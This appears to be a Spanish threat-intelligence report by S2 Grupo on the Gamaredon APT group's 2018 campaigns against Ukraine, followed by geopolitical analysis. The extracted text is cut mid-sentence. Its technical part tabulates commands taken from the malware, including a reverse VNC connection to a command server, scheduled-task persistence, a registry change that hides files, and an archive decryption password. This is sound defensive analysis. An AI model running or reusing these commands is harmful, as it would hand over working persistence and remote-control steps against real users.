{
    "id": "701d2877-8b62-439d-a6e4-41cdd0f9d730",
    "created_at": "2022-10-25T16:48:18.529263Z",
    "updated_at": "2025-03-27T02:13:57.095782Z",
    "deleted_at": null,
    "sha1_hash": "c4209e9de8f50528d4b6c72d36f319a684121a9f",
    "title": "",
    "authors": "",
    "file_creation_date": "2019-01-08T11:07:35Z",
    "file_modification_date": "2019-01-08T11:07:37Z",
    "file_size": 3097904,
    "plain_text": "# GRUPO DE ELABORACIÓN DE INTELIGENCIA (GREIN)\n\n###### GAMAREDON Y LOS AVANCES DEL CONFLICTO GEOPOLÍTICO ENTRE RUSIA Y UCRANIA 2018\n\n\n-----\n\nRESUMEN EJECUTIVO\nANÁLISIS TÉCNICO\n\n  - Estructura interna del malware\n\n  - Malware con un solo nivel de anidamiento para reconocimiento y despliegue\n\n  - Malware con dos niveles de anidamiento para reconocimiento y despliegue\n\n  - Malware con un nivel de anidamiento para control remoto\n\n  - Comandos ejecutados por el malware tras la infección\n\n  - Tráfico de red\nANALISIS DE INFRAESTRUCTURA\nRESUMEN SITUACIONAL GEOESTRATEGICO\nANALISIS GEOPOLITICO Y GEOESTRATEGICO\n\n\n\n- Avances del conflicto global de Ucrania durante 2018\n\n- Operaciones de desconexión política, religiosa y sociocultural entre Ucrania y\n\nRusia:\n\n- Comercio Internacional y el Puerto de Kerch\n\n- Aumento de la tensión militar entre Ucrania, la OTAN y Rusia:\n\n- Recientes ciberataques y acciones de ciberespionaje entre Rusia, Ucrania y países de\n\n\nla OTAN.\nCONCLUSIONES\nREFERENCIAS:\nANEXOS\n\n  - INDICADORES DE COMPROMISO\n\n  - PROTOCOLO DE INTERCAMBIO\n\n\n-----\n\nDurante los últimos meses desde S2 Grupo hemos estado rea­\nlizando un seguimiento al actor Gamaredon, del cual ya hace un\ntiempo tanto Paloalto como Looking glass hicieron un análisis y\ndetallaron lo que parecían ser las intenciones de este grupo.\n\nEste análisis comenzó a raíz de las publicaciones llevadas a cabo\npor la cuenta de twitter @Drunkbinary. Esta cuenta hace unos\nmeses empezó a publicar nuevos hashes relacionados con este\ngrupo y lo que llamó la atención fue la diversidad de hashes publi­\ncados cada día y la cantidad.\n\nDespués del análisis realizado desde un punto de vista técnico se\ndestacarían de este grupo los siguientes aspectos:\n\n1. Este grupo con una alta probabilidad dispone de una he­\nrramienta para generar, ofuscar y desacoplar los scripts en\nficheros batch de extensión cmd dado que generan nue­\nvas versiones rápidamente.\n\n2. El grupo utiliza dominios ddns.net. Estos dominios sue­\nlen estar muy monitorizados en entornos empresariales y\ncada vez son menos utilizados por grupos APT. Este tipo\nde dominios es más eficaz si atacan a usuarios domésti­\n\n\ncos, lo que coincide con lo indicado por PaloAlto o Looking\nGlass. Por parte de S2 Grupo se ha observado que parte\nde sus víctimas parecen ser usuarios tras ISP, que normal­\nmente están asociados a perfiles domésticos.\n\n3. Algunos nombres de dominio reflejan directamente lo que\nva a ser su función en el ataque, como por ejemplo “dro­\npper.crimea.com”. Esto es muy extraño y da la impresión\nde que los integrantes del grupo están realizando pruebas\ncon un entorno real. Este hecho no debe restar importan­\ncia ya que están realizando infecciones reales y teniendo a\nsu disposición una botnet geolocalizada en Ucrania.\n\n4. En estas últimas campañas utilizan 7zip SFX y van varian­\ndo la cantidad de niveles de anidamiento donde al final es­\ntará el binario o los ficheros con extensión .cmd, que son\nlos que realmente establecerán la persistencia y lanzarán\nla lógica para conectar con el servidor de mando y control.\n\n5. Otro aspecto muy significativo es que continúan utilizando\npara llevar a cabo sus comunicaciones HTTP la aplicación\nwget para entornos Windows.\n\n6 Quizá uno de los aspectos más interesantes es que en es\n\n\n-----\n\ntas campañas la gran mayoría de binarios tienen los me­\ntadatos de la aplicación CryptoPro CSP. Este hecho hace\nplantearse a S2 Grupo que los atacantes estén utilizando\neste software como un señuelo o gancho. De todos mo­\ndos, esta afirmación es una hipótesis que no ha podido ser\ncontrastada..\n\nRecomendamos la lectura de los informes de PaloAlto y Looking\nGlass ya que dan mucha información que ayuda a entender a este\ngrupo. Este informe ha revisado el estado del grupo Gamaredon\na fecha de noviembre de 2018, observando que su variación en\ncuanto a TTP (Técnicas Tácticas y Procedimientos) ha sido mí­\nnima (por lo menos con la información a la que ha tenido acceso\nS2 Grupo) pero que sigue siendo muy efectivo debido a la gran\ncantidad de clientes infectados.\n\nPara entender los intereses de un grupo como Gamaredon es ne­\ncesario conocer en profundidad el conflicto entre Ucrania y Rusia.\nEste conflicto ha sufrido un fuerte incremento de tensiones duran­\nte el transcurso de 2018. Los ataques cibernéticos no han cesado,\nincluso se puede apreciar que se han incrementado durante este\naño. La OTAN y Rusia están en un momento donde sus relaciones\ndiplomáticas son tensas e inestables. Esto se debe a las grandes\noperaciones y maniobras que la OTAN está llevando a cabo en\nterritorio fronterizo con Rusia para dar soporte al gobierno ucra­\nniano (Operación Trident Juncture). Este fenómeno ha provocado\n\n\nque Rusia busque generar una franja de defensa militar para evitar\nla potencial amenaza que supone la OTAN hacia el Kremlin.\n\nLa ocupación de Crimea por parte de Rusia generó un conflicto\nque se ha extendido en la zona fronteriza de Donetsk y Lugansk,\nen Ucrania, donde los rebeldes pro-rusos, el “DNR” y “LNR”, es­\ntán llevando a cabo insurgencias y conflictos armados en la\nzona fronteriza. Rusia a través de su soporte político-militar a los\ngrupos insurgentes mencionados pretende generar un clima de\ninestabilidad política e inseguridad social. Además a través del\nEstrecho de Kerch, Rusia impide a los navíos mercantes ucrania­\nnos su normal tránsito, perjudicando de este modo la economía\nde Ucrania. Estos conflictos están incrementando gravemente\nlos ataques cibernéticos y las operaciones de ciberespionaje de\ngrupos APT presuntamente asociados al Kremlin hacia organiza­\nciones de Ucrania de diversos sectores. Uno de estos grupos APT\nes Gamaredon, bautizado así por PaloAlto, que según diversas\ninformaciones podría ser un grupo para llevar a cabo operaciones\nde entrenamiento y prácticas de ciberataque contra intereses\nucranianos; sin embargo, este hecho no les hace menos nocivos.\nEl siguiente informe muestra un análisis de inteligencia técnica y\ngeoestratégica sobre la actividad del grupo APT Gamaredon y la\nevolución del conflicto entre Ucrania y Rusia durante 2018.\n\n\n-----\n\nDurante el estudio llevado a cabo se han analizado diferentes arte­\nfactos utilizados por el grupo Gamaredon. Este grupo va variando\ndiferentes aspectos de la estructura del malware aunque todas\nestas formas, por el momento, siguen la misma esencia: se tra­\nta de ficheros comprimidos, 7zip SFX (self-extraction archive) en\neste caso, que en su interior contienen ficheros batch con exten­\nsión cmd que son los que marcan el flujo de ejecución del malwa­\nre. Estos ficheros batch principalmente crean persistencia, recopi­\nlan información, y permiten ejecutar nuevos 7zip SFX o binarios.\nRealizando un símil, con la herramienta 7zip crean una estructura\nde muñeca Matrioshka, donde por el momento solo se han visto\ndos niveles, pero en un futuro es probable que se vean más niveles\npara reducir las tasas de detección de los antivirus.\n\nCuando se dice que cambian de estructura es que este actor va\nmutando la amenaza con cambios como los siguientes:\n\n   - Crean un fichero 7zip SFX con otro fichero 7zip cifrado con\n\ncontraseña y dentro un conjunto de ficheros batch.\n\n  - Crean un fichero 7ip SFX y dentro directamente los fiche­\n\nros .cmd.\n\n\n\n   - Crean un fichero 7zip SFX y dentro un .cmd que realiza una\n\nconexión inversa winVNC.\n\n   - Crean ficheros 7zip SFX con el binario de 7zip dentro (7za.\n\nexe) para usarlo como herramienta de cifrado o descifra­\ndo. También se han visto muestras que utilizan una he­\nrramienta externa para descifrar las actualizaciones del\nmalware. Esta última es detectada por la gran mayoría de\nlos antivirus.\n\n##### Estructura interna del malware\n\nComo se ha comentado el malware viene empaquetado con 7zip y\nsu contenido cambia rápidamente. Desde un punto de vista inter­\nno van variando las herramientas que utilizan y los niveles de ani­\ndamiento hasta que están los scripts en batch que realizan la lógi­\nca del propio malware. A continuación se analizan varios ejemplos\nde estructura observada en estos meses con los aspectos más\ndestacados en cada caso.\n\n\n-----\n\n###### Malware con un solo nivel de anidamiento para reconocimiento y despliegue\n\nEl malware utilizado por Gamaredon tiene diferentes niveles de\nanidamiento hasta que se encuentra la lógica. A continuación se\nvan a detallar los componentes internos de uno de los últimos\nartefactos observados en formato 7zip SFX (ce8894f381314a­\n549137fbbcfcd0edf3304b848cd5473e7f40f2276bf368973d) que\ncontienen directamente todos los ficheros en batch para realizar\nla lógica del malware, es decir, solo un nivel de anidamiento:\n\n  - 0tgEYuf7QQV70YaDP: contiene la misma cadena que uti­\n\nliza de nombre, y no se ha observado su utilización en la\nlógica de la amenaza.\n\n  - attrs.cmd: fichero que realiza ejecuciones del comando\n\nattrib sobre ficheros con extensión .doc para cambiar sus\npropiedades.\n\n   - Crypt.exe: Herramienta que se ha visto que se utiliza para\n\ndescifrar las actualizaciones del malware (en otras oca­\nsiones dentro hay embebido un 7zip, binario 7za.exe, para\nrealizar esta misma tarea).\n\n  - id.cmd: Obtiene información de los discos con WMI.\n\n   - OfficeModule.exe: Este es el binario wget para enviar infor­\n\nmación y descargar. Este elemento suele estar en un alto\nporcentaje de binarios del grupo Gamaredon.\n\n\n\n  - usb.cmd: En este script crea un enlace a mis documentos\n\n(.LNK) para después ejecutar el malware, poniéndole un\nicono de una carpeta.\n\n  - Wariables.cmd: Fichero donde se definen varias de las va­\n\nriable que se utilizarán por el resto de scripts.\n\n  - Wars.cmd: Fichero que se invoca cuando se ejecuta el fi­\n\nchero 7zip SFX y por lo tanto el punto de entrada a toda la\nejecución.\n\nEste malware fue subido a Virus Total Intelligence por primera vez\nel 07-11-2018. Al estar comprimido con 7zip, en el momento que\nse realizan pequeños cambios sobre los ficheros batch se van ge­\nnerando nuevos hashes y por tanto se van viendo en VTI nuevas\nmuestras de una manera muy habitual:\n\n\n-----\n\nEste sería una de las estructuras más básicas y habituales de las\nvistas por el momento.\n\n**Malware con dos niveles de anidamiento para reconocimiento y**\n**despliegue**\n\nOtra estructura encontrada durante\nel análisis (4d606ae6d742daaee­\n7cbbd9d1f00dbb4c9ee11e7b­\n4f30439e402900c0a32180a) es\nen la que los atacantes colocan un\nfichero 7zip SFX y dentro tienen la\naplicación 7zip (7za.exe) con un\nfichero cifrado con 7zip. Esto des­\ncomprime otro fichero 7zip y le pasa\n\n\nCuando el binario se ejecuta llama al fichero delsold.cmd para ac­\ntivar la lógica del malware que descomprimirá el fichero setup.dll.\nzip:\n\nPuede apreciarse en esta captura el nivel de ofuscación para en­\ntorpecer la detección y dificultar el análisis manual. Si en un en­\ntorno de laboratorio se descomprime con las credenciales vistas,\ncomo lo hace el script, se puede obtener un nuevo fichero binario\nen formato PE:\n\n\n-----\n\nEste binario PE de nuevo es otro 7zip SFX que al descomprimirlo\nse tiene varios ficheros de extensión cmd:\n\nDesde estos ficheros con extensión cmd se llama a OfficeModule\n(wget) para descargar y ejecutar nuevas acciones o nuevas va­\nriantes del malware. Para la ejecución de nuevos comandos los\natacantes solo deben dejar un fichero comprimido con 7zip y la\ncontraseña vista anteriormente en el servidor web y enviarlo como\nrespuesta a la petición HTTP que realiza el OfficeModule.\n\n**Malware con un nivel de anidamiento para control remoto**\n\nOtra de las variantes encontradas (4d27abd60dac79e8512b­\n547975ca83d1737482fe80f223e7d53224a1d6bc22fb) utiliza\nWinVNC para tomar el control del equipo de la víctima. Se puede\nobservar una vez descomprimido el 7zip la siguiente información:\n\n\nLos atacantes instalan el servidor de VNC en la máquina de la víc­\ntima y alojan un cliente en un servidor remoto para que automá­\nticamente el servidor establezca la comunicación con ese cliente.\nEsta técnica ya había sido descrita en los informes de PaloAlto y\nLooking Glass. Este hecho indica que siguen utilizando este modo\nde obtener el control del equipo.\n\n**Comandos ejecutados por el malware tras la infección**\n\nDurante la realización de la investigación se han recopilado va­\nrias muestras y se han lanzado para observar los comandos más\nutilizados por este grupo en la fase inicial de infección, ya que\ndespués de su primera ejecución los atacantes pueden lanzar\ncualquier otro comando o binario. Los siguientes comandos son\nlos más habituales de las muestras analizadas:\n\n\n-----\n\n|Comando(s)|Descripción|\n|---|---|\n|7za.exe e -pgjghj,eqhfcgfreqgbyljc \"cBlJK\"|Comando para descifrar utilizado en las últimas campañas. En la investigación solo se ha visto esta contraseña (gjghj,eqhfc­ gfreqgbyljc)|\n|chcp 1251|Adaptar el script a alfabeto cirílico|\n|cmd /c \"\"C:\\Users\\a\\AppData\\Local\\Temp\\7ZipSfx.000\\Wars. cmd\" otu\"|Ejecución del script que desencadena toda la ejecución.|\n|cmd /c \"C:\\Users\\a\\AppData\\Roaming\\VncServer\\run-vnc. bat\"|Ejecución de un servidor VNC en la víctima para realizar una conexión inversa y así poder tomar el control de la víctima.|\n|C:\\Users\\a\\AppData\\Local\\Temp\\7ZipSfx.00c\\win32k.sys -autoreconnect -id:SIMF_LUCAS-PC_{846ee340-7039-11de- 9d20-806e6f6e6963} -connect check-update.ru:5500|Ejemplo del comando que hace la conexión inversa al puerto 5500 para que los atacantes controlen la máquina por VNC.|\n\n\n###### \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\crypt­ cp.exe\"\n\n \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Crypto\\RSA\\crypt­ cp.exe\"\n\n “C:\\Users\\a\\AppData\\Local\\Temp\\7ZipSfx.00c\\win32k.sys”\n\n \"C:\\Users\\a\\CookiesERR\\Cookies.exe\"\n\n \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\Office\\CryptoTools\\ CryptoTools.exe\"\n\n\n###### Diferentes lugares de ejemplo donde se ubican los binarios. Parece que en esta campaña todo está relacionado con la herramienta de cifrado que utilizan para enmascararse y se ha visto en los metadatos (CryptoPro CSP).\n\n\n-----\n\n|C:\\Windows\\system32\\cmd.exe /c Dir \"C:\\Users\\a\\AppData\\ Roaming\\Microsoft\\Office\\CryptoTools\\*\" /B|Ejecución de un Dir /B. Se muestra un listado de directorios pero con encabezado simple sin información extra.|\n|---|---|\n|C:\\Windows\\system32\\cmd.exe /c Reg.exe Query \"HKCU\\Sof­ tware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"|­ Find /I \"ProxyPass\" C:\\Windows\\system32\\cmd.exe /c Reg.exe Query \"HKCU\\Sof­ tware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"|­ Find /I \"ProxyServer\" C:\\Windows\\system32\\cmd.exe /c Reg.exe Query \"HKCU\\Sof­ tware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\"|­ Find /I \"ProxyUser\"|Búsqueda de características del proxy|\n|C:\\Windows\\system32\\cmd.exe /c Reg query \"HKEY_LO­ CAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\IDConfigDB\\ Hardware Profiles\\0001\" | Find /i \"HwProfileGuid\"|Búsqueda del perfil hardware|\n|C:\\Windows\\system32\\cmd.exe /c tasklist /FI \"IMAGENAME eq cryptcp.exe\" | find /C \"cryptcp.exe\" C:\\Windows\\system32\\cmd.exe /c tasklist /fi \"PID eq 2312\" / fo csv|Listar los servicios|\n\n\n-----\n\n|C:\\Windows\\system32\\cmd.exe /c WMIC LogicalDisk Where (DriveType=2 And MediaType=NULL) Get Name,VolumeSerial­ Number /Value|Find \"=\" C:\\Windows\\system32\\cmd.exe /c wmic OS get oslanguage C:\\Windows\\system32\\cmd.exe /c wmic process get paren­ tprocessid, commandline /value C:\\Windows\\system32\\cmd.exe /c wmic process where \"Na­ me='a.exe'\" get ExecutablePath /value| findstr|Ejecuciones de wmic para obtener información|\n|---|---|\n|\"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\a\\AppData\\ Local\\Temp\\7ZipSfx.01e\\cokies.vbs\" \"C:\\Windows\\System32\\WScript.exe\" \"C:\\Users\\a\\AppData\\ Local\\Temp\\7ZipSfx.023\\error.vbs\"|Otro tipo de ficheros utilizados son visual basic script.|\n|findstr \"\\&lt;.rdata\\&gt;\" dAWEb.exe|Búsqueda de la cadena .rdata en el binario|\n|ping 127.0.0.1 ping 8.8.8.8 ping 8.8.8.8 ping dropdrop.ddns.net -n 2 -4 ping dropper.crimea.com -n 2 -4 ping telo-spread.ddns.net -n 2 -4|Ejemplo de comandos ping|\n\n\n-----\n\n|reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ Explorer\\Advanced\\ /v Hidden /t REG_DWORD /d 00000002 /f Reg.exe Query \"HKCU\\Software\\Microsoft\\Windows\\Curren­ tVersion\\Internet Settings\" REG QUERY \"HKCU\\Software\\Microsoft\\Windows\\CurrentVer­ sion\\Explorer\\Advanced\" /v Hidden Reg query \"HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\ Control\\IDConfigDB\\Hardware Profiles\\0001\"|Claves de registro que consulta y modifica.|\n|---|---|\n|schtasks /Create /SC MINUTE /MO 12 /F /tn cryptcp /tr \"C:\\ Users\\a\\AppData\\Roaming\\Microsoft\\Crypto\\Keys\\cryptcp. exe\"|Ejemplo de persistencia en el registro|\n|fc /b \"CzCDG.exe\" \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\ Crypto\\RSA\\cryptcp.exe\" fc /b \"DFyXM.exe\" \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\ Crypto\\Keys\\cryptcp.exe\" fc /b \"DgKBC.exe\" \"C:\\Users\\a\\AppData\\Roaming\\Microsoft\\ Crypto\\Keys\\cryptcp.exe\"|Compara los binarios con el comando fc.exe. Su objetivo es ver si existe ya.|\n\n\n-----\n\nEl estudio de las diferentes muestras reflejan las siguientes carac­\nterísticas respecto al tráfico de red:\n\n   - El tráfico de red HTTP va sin cifrar y no se ha visto que\n\nutilice HTTPS\n\n  - Los envíos de información hacia el servidor de mando y\n\ncontrol se realizan mediante peticiones POST a un fichero\nPHP. A continuación se puede ver un ejemplo de una peti­\nción realizada:\n\n   - Para el control del equipo de la víctima utilizan también el\n\nprotocolo VNC. Para ello utilizan la posibilidad de VNC de\nhacer que el servidor intente conectar a un cliente y con\nesto saltarse las restricciones de control de las organiza­\nciones.\n\n  - Para todas las comunicaciones HTTP se utiliza la aplica­\n\nción wget con el user-agent por defecto.\n\n\nmuestras analizadas en los últimos meses de las muestras re­\ncopiladas sobre este grupo. Se observa que no existe ninguna\nevolución significativa respecto a lo ya comentado por PaloAlto\ny LookingGlass en cuanto a su modo de actuar. El grupo va utili­\nzando diferentes estrategias basadas en ficheros con extensión\ncmd y 7zip SFX (utilizado como packer principalmente). Pero lo\nque es una realidad es que sigue siendo efectivo por la cantidad de\nvíctimas infectadas como ya se ha mencionado. Esta efectividad\nsorprende ya que estas muestras son detectadas por gran parte\nde los fabricantes antivirus.\n\n\n-----\n\nGamaredon es un grupo APT que está presuntamente asociado al\nKremlin, concretamente al Servicio de Inteligencia FSB y fue des­\ncubierto en 2013. Es un grupo APT caracterizado por llevar a cabo\noperaciones de ciberespionaje en los sistemas IT personales (no\nprofesionales) de los miembros de organizaciones gubernamen­\ntales, oficiales del ejército e instituciones legislativas del Estado.\nEl estudio llevado a cabo con la información obtenida (totalmente\nparcial), nos ha permitido hacernos una idea de la gran tasa de\ninfección que alcanza este grupo, ya que partiendo de la volume­\ntría extraída de un subconjunto acotado, se han podido identificar\nhasta 1.526 IP únicas que contactan con dominios de command\nand control, de las cuales 1.500 se encuentran dentro de Ucrania:\n\n\nDentro del territorio ucraniano, las IP están ubicadas dentro de las\nzonas más céntricas de las principales ciudades dentro de Ucra­\nnia, de las cuales más del 50% se encuentran en los alrededores\ndel centro de Kiev (esta información está basada en la geoloca­\nlización de las direcciones IP, por lo que debe considerarse una\ninformación aproximada y poco precisa dentro de un país):\n\n\n-----\n\nDe todo el conjunto de direcciones IP comprometidas, se ha po­\ndido observar que en la mayoría de casos, aparentemente per­\ntenecen a direcciones de usuarios privados, en lugar de equipos\nde grandes organizaciones, algo que viene siendo común en los\nobjetivos de este grupo. Un ejemplo de esto es el hecho de que en\ngeneral, las direcciones IP pertenecen a los principales ISP priva­\ndos de servicios genéricos de internet, en lugar de a direcciones\nde Organizaciones públicas o privadas; entre estos ISP destaca\n“Intertelecom Ltd”, con cerca del 66% de las direcciones IP.\n\n\nTras un estudio de las direcciones IP a las que han resuelto cada\nuno de los dominios de servidores de mando y control analizados\ndurante los últimos meses, se ha observado que la distribución de\nlas IP de mando y control se encuentra ubicada en Rusia en todos\nlos casos (esta información está basada en la geolocalización de\nlas direcciones IP, por lo que debe considerarse una información\naproximada y poco precisa dentro de un país):\n\nA partir de servicios como el de RiskIQ donde es posible ver un\nhistórico de qué direcciones IP han sido asignadas a un nombre\nde dominio, se puede extraer la evolución de alta y cambio de IP\nde cada uno de los dominios durante los últimos meses, donde\nse puede observar como destaca el día 20 de agosto de 2018, en\nel que aparentemente cambian las direcciones de resolución de\nvarios dominios, y aparecen algunos nuevos para esa campaña.\n\n\n-----\n\nDestaca el hecho de que las direcciones IP a las que han resuelto\nlos dominios durante las fechas anteriores al 20 de agosto, perte­\nnecen al ISP privado de Rusia “IT Expert LLC”, mientras que a par­\ntir del día 20 de agosto migran todas las direcciones IP al servicio\nde Hosting y alquiler de VPS “McHost.Ru”.\n\n\n-----\n\n## 4. RESUMEN SITUACIONAL GEOESTRATEGICO\n\n\nDurante el transcurso de 2018 Ucrania ha experimentado y sufri­\ndo las operaciones geoestratégicas y cibernéticas presuntamente\ndel Kremlin para adquirir el control del gobierno de Kiev liderado\npor Petró Poroshenko, Presidente de la República y por Volodym\nGroysman, Primer Ministro de Ucrania con un determinado corte\npro-europeísta, nacionalista y contrario a las corrientes pro-rusas\nafincadas dentro de la sociedad ucraniana. En el siguiente apar­\ntado se hará mención a las acciones geoestratégicas más rele­\nvantes de 2018 en el conflicto geopolítico entre Rusia y Ucrania,\nconflicto que desde 2014 a 2018 acumula 10.300 muertos.\n\nLa internacionalización del conflicto, los intereses energéticos, la\nmanipulación psicosocial, los asentamientos militares y los ata­\nques cibernéticos han incrementado las tensiones entre Ucrania,\nla OTAN y Rusia.\n\nA nivel cibernético, durante 2018 han aumentado significativa­\nmente los ciberataques a organizaciones de Ucrania y se ha de­\ntectado un claro aumento dentro de las actividades de ciberespio­\nnaje a nivel estatal.\n\n\n-----\n\n**Avances del conflicto global de Ucrania durante 2018**\n\nLas tensiones diplomáticas y militares entre los dos Estados se\nhan incrementado notablemente durante 2018. Durante este mis­\nmo año, el Kremlin ha declarado oficialmente que en el caso de\nque Georgia y Ucrania se incorporaran a la OTAN, Rusia diseñaría\ny aplicaría una franja de defensa militar entre los dos estados. Di­\ncho fenómeno generaría un elevado coste Estatal para el Kremlin.\nSe espera que Georgia se incorpore dentro de la OTAN en 2021.\nRespecto a Ucrania, el parlamento modificó su legislación para\ntener la viabilidad para incorporarse dentro de una organización\ninternacional armada, como es el caso de la OTAN. El actual go­\nbierno de Ucrania se muestra crítico con la UE, pero sin embargo\nforma parte de sus objetivos formar parte de la UE y consecuen­\ntemente de la OTAN para poder capacitar a su ejército frente a las\namenazas pro-rusas, (Sánchez, 2015).\n\nDurante 2018, EEUU y la OTAN se han mantenido firmes respecto\na sus posiciones diplomáticas en relación a las sanciones econó­\nmicas establecidas hacia la Federación de Rusia. Los comunica­\ndos oficiales de la OTAN han transmitido que las sanciones no ce­\n\n\nsarán si Rusia no desocupa militarmente la península de Crimea.\nLa ocupación de Crimea por parte de Rusia tiene tres objetivos\nfundamentales:\n\n1. La península de Crimea es una localización geoestratégica\n\nclave para aumentar el control del Kremlin dentro del tráfi­\nco marítimo del Mar Negro.\n\n2. Establecer una ruta segura para llevar a cabo más ga­\n\nsoductos que permitan y garanticen el abastecimiento de\ngas en la UE proveniente de Rusia.\n\n\n-----\n\n3. Establecer una franja de seguridad respecto al persistente\n\navance de la OTAN dentro de Europa. La OTAN pretende\nasociar al máximo de países de la UE y Europa. Conse­\ncuentemente, el Kremlin no podrá volver a aplicar el inte­\nrregionalismo basado en los acuerdos comerciales, mili­\ntares y diplomáticos con los Estados fronterizos del Este.\n\nSegún la plataforma del Departamento de Estado de Estados Uni­\ndos “ShareAmerica” la tensión diplomática entre la OTAN y Rusia\nse ha incrementado significativamente desde octubre de 2018\ndespués de la maniobra militar en el Mar Báltico por parte del “Tri­\ndent Juncture”. Otras maniobras militares del Trident de la OTAN\nse han llevado a cabo en Donetsk, la zona de Ucrania donde exis­\nten las tropas insurgentes pro-rusas con más actividad. Esta ope­\n\n\nrativa ha contado con 2.500 militares de diez países de la OTAN y\nsus dos principales objetivos han sido:\n\n1. Entrenar la coordinación y la eficacia de las operaciones\nconjuntas entre militares de 31 países de la OTAN.\n\n2. Llevar a cabo un mensaje disuasorio hacia el Kremlin y su\npolítica de ocupación de territorios soberanos.\n\n3. Operaciones de desconexión política, religiosa y sociocul­\ntural entre Ucrania y Rusia:\n\nEl Patriarcado Ortodoxo de Kiev se ha desvinculado plenamente\ndel Patriarcado de Constantinopla de la iglesia ortodoxa de Rusia.\nEste mismo ha tenido que ceder en octubre de 2018 a las presio­\nnes de Kiev y ha conseguido ser un órgano religioso plenamente\nindependiente. Este hecho ha supuesto una pérdida de conexión\nsociocultural entre el Kremlin y la sociedad pro-rusa de Ucrania,\nacción promovida por el actual gobierno nacionalista de Ucrania,\nel cual pretende desconectar uno de los elementos psicosociales\nmás influyentes en la cohesión social entre Ucrania y Rusia que\nes la fe ortodoxa. Ucrania busca frenar el aumento de afinidades\npro-rusas dentro de su propia sociedad para evitar más anexiones\ncon Rusia en un futuro. El objetivo del gobierno nacionalista de\nUcrania es la ruptura cultural entre ambos Estados.\n\nDurante 2018 los escenarios del conflicto se han polarizado y\n\n\n-----\n\nradicalizado entre los grupos insurgentes pro-rusos y los parti­\ndos nacionalistas proteccionistas. El clima social se ha tensio­\nnado y la crisis económica ha perjudicado seriamente la calidad\nde vida de los ciudadanos. Las elecciones generales de Ucrania\nestán previstas para el 2019. Este fenómeno ha sido incentivado\npor el Kremlin, el cual da apoyo económico y armamentístico a\nlos grupos rebeldes pro-rusos. El Kremlin mantiene como target\ngenerar un escenario de inestabilidad social para provocar unas\nelecciones generales anticipadas. También pretende disminuir la\ncalidad de vida de la sociedad ucraniana mediante el incremento\nde la violencia insurgente, inestabilidad social y recesión econó­\nmica; sin embargo, al mismo tiempo, el Kremlin pretende llevar a\ncabo inversiones energéticas dentro de Crimea: durante 2018 han\npresentado proyectos de construcción de centrales eléctricas y de\ngaseoductos dentro de la península. Con esta estrategia, el Kre­\nmlin pretende seducir y atraer a más partes de la sociedad ucra­\nniana mediante el incremento de inversiones y mejoras sociales\nen territorios ocupados como Crimea. El objetivo del Kremlin es\ntransmitir que los territorios ocupados por Rusia gozan de mayor\ncalidad de vida.\n\n**Comercio Internacional y el Puerto de Kerch**\n\nSegún la organización del Instituto de Estrategia, durante 2018 se\nhan incorporado nuevas modalidades de ataque entre los dos es­\ntados. Rusia ha inaugurado el puente de Kerch en Crimea. Geoes­\n\n\ntratégicamente es un canal altamente relevante para el transporte\nmarítimo que sale desde Ucrania y Rusia hacia el Mar Mediterrá­\nneo y el Mar Rojo. El control del canal optimiza el comercio inter­\nnacional de Rusia.\n\nEl Kremlin ha iniciado desde la inauguración del Puente de Kerch\nen Mayo de 2018 una operación para disfuncionalizar el comercio\ninternacional naval de Ucrania. Esta operación la está llevando a\ncabo mediante controles de seguridad a buques y navieros ucra­\nnianos que pretenden cruzar el Puerto de Kerch. Estos “contro­\nles de seguridad” provocan considerables retrasos dentro de las\ncompañías navieras y consecuentemente afectan a la economía\nucraniana. Ralentizar las exportaciones marítimas de un país im­\n\n\n-----\n\nplica consecuencias negativas directas a la economía estatal. El\nKremlin pretende desequilibrar a la economía de Ucrania y conse­\ncuentemente a su gobierno nacionalista.\n\nDurante el mes de Noviembre de 2018 Rusia y Ucrania se han con­\nfrontado en el Mar de Azov, dentro de las cercanías del Puente de\nKerch. Un barco de la armada ucraniana entró dentro del períme­\ntro de aguas rusas (adquiridas después de la adquisición de Cri­\nmea). Este hecho ha provocado un choque entre navíos e incluso\nel ejército ruso ha abierto fuego hiriendo a un soldado ucraniano.\nPosteriormente el Presidente del gobierno ucraniano ha aprobado\nla ley Marcial dejando en alerta al ejército ucraniano ya que afirma\ndisponer informaciones de los Servicios de Seguridad Ucranianos,\nlas cuales afirman que Rusia está preparada para llevar a cabo\nuna operación con su infantería en Ucrania.\n\n**Aumento de la tensión militar entre Ucrania, la OTAN y Rusia:**\n\nLas tensiones militares entre insurgentes pro-rusos y naciona­\nlistas ucranianos se han intensificado en Donetsk. Incluso los\nconflictos armados se han aproximado hacia la frontera con Ru­\nsia durante el mes de octubre de 2018. El ejército de Ucrania ha\nestado llevando a cabo ejercicios de entrenamiento con misiles\nS-300PS, S-300PT y misiles antiaéreos Buk M1 por la región de\nKherson, una región cercana a Crimea. Este hecho fue interpreta­\ndo por el Kremlin como una provocación por parte de Kiev. EEUU y\n\n\nla OTAN no están tomando ninguna medida al respecto, cuestión\nque ha reclamado en varias ocasiones el Kremlin. Los EEUU han\ncontribuido a aumentar la competitividad del ejército de Ucrania\ncon la entrega de diversas fragatas de la clase Oliver Hazard Perry.\n\nEl ejército de Ucrania, durante el mes de septiembre de 2018, rom­\npió la tregua oficial que se había establecido con los grupos in­\nsurgentes pro-rusos. Ucrania atacó con morteros del calibre 82,\nlanzagranadas y armas de tiro la zona de Lugansk. El armisticio se\nanunció el 29 de agosto de 2018 y después de quince días Ucrania\nrompió el pacto de la tregua. La tensión y la actividad entre los\ngrupos rebeldes y el Estado de Ucrania vuelve a ser alta, y conse­\ncuentemente el incremento de víctimas mortales también.\nRusia pretende vincular el actual gobierno de Ucrania con el\nDAESH. Según Hispan TV, El FSB comunicó en septiembre de 2018\nque el gobierno de Ucrania, a través de su Servicio de Inteligen­\ncia y del grupo de extrema derecha ucraniana “Pravy Sektor”, que\nestá ilegalizado en Rusia, ha financiado y respaldado a Medzhid\nMagomédov, miembro del DAESH, para cometer atentados en 